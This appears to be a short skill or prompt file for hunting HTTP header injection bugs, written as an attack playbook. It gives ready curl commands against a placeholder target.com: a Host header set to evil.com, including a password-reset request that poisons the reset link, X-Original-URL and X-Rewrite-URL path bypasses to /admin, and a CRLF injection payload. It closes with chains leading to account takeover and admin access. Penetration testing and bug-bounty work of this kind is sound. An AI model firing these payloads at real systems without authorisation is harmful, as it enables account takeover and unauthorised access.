---
name: hunt-headers
description: HTTP header injection — Host header, password reset poisoning, CRLF, response splitting, path bypass via headers.
---

# HEADER INJECTION HUNTING — 3 BULLETS MAX

**Core:** Server trusts user-controlled headers without validation.

## DIFFERENTIAL
```bash
# Host header injection
curl -s -H "Host: evil.com" "https://target.com/" -o /dev/null -w "%{http_code}"
# Password reset poisoning
curl -s -X POST "https://target.com/auth/reset" -H "Host: evil.com" -d "email=victim@test.com"
# Path bypass
curl -s -H "X-Original-URL: /admin" "https://target.com/"
curl -s -H "X-Rewrite-URL: /admin" "https://target.com/"
# CRLF injection
curl -s "https://target.com/?name=test%0d%0aInjected-Header:value" -I
```

## ATTACKS
```
Host header: password reset poisoning, cache poisoning, SSRF
X-Forwarded-Host: reflection, cache poisoning
X-Original-URL/X-Rewrite-URL: path bypass, WAF bypass
CRLF: response splitting, XSS, cookie injection, cache poisoning
```

## CHAINS
```
Host header → password reset poisoning → ATO → Critical
Host header → cache poisoning → XSS for all → Critical
CRLF → response splitting → XSS → High
X-Original-URL → path bypass → admin access → Critical
```
